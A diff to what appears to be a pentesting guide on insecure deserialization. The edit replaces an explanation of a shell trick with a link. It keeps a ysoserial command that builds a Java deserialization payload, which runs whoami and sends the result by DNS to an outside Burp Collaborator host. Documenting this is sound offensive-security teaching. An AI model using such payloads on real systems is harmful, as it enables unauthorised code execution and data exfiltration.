@@ -1130,7 +1130,7 @@ How to spot Insecure deserialization
 
 **Ysoserial**
 
-Because of `Runtime.exec()`, ysoserial doesn't work well with multiple commands. After some research, I found a way to run multiple sys commands anyway, by using `sh -c $@|sh . echo ` before the multiple commands that we need to run. Here I needed to run the command `host` and `whoami`:
+Because of `Runtime.exec()`, ysoserial doesn't work well with multiple commands. For more information, read "[$@|sh – Or: Getting a shell environment from Runtime.exec](https://codewhitesec.blogspot.com/2015/03/sh-or-getting-shell-environment-from.html)". Here I needed to run the command `host` and `whoami`:
 
 ```
 java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections7 'sh -c $@|sh . echo host $(whoami).<MY-RATOR-ID>.burpcollaborator.net' | gzip | base64
